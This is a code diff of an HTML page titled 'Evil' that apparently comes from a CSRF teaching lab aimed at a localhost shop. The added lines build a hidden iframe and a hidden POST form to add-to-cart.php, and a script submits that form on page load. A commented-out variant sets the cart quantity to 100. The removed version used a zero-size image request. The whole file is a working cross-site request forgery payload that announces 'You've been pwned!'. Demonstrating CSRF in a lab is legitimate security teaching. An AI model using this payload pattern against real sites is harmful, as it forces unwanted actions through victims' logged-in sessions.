@@ -1,4 +1,30 @@
-<html>
-<!--Destroys user session -->
-<img src="php/update-cart.php?quantity_iFone7=1" width="0" height="0">
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>Evil</title>
+	</head>
+	<body>
+		<h1>CSRF - You've been pwned!</h1>
+		<iframe style="display:none" name="frame"></iframe>
+
+    <!-- This form will add an iFone7 to the cart  -->
+
+		<form method="POST" action="http://localhost:8888/php/add-to-cart.php" target="frame" id="form">
+			<input type="hidden" name="productType" value="iFone7">
+			<input type="hidden" value="submit">
+		</form>
+
+    <!-- This form will update the cart with 100 iFone7   -->
+
+    <!-- <form method="POST" action="http://localhost:8888/php/update-cart.php" target="frame" id="form">
+      <input type="hidden" name="quantity_iFone7" value="100">
+      <input type="hidden" value="submit">
+    </form> -->
+
+		<script>
+			document.getElementById("form").submit()
+		</script>
+
+	</body>
 </html>
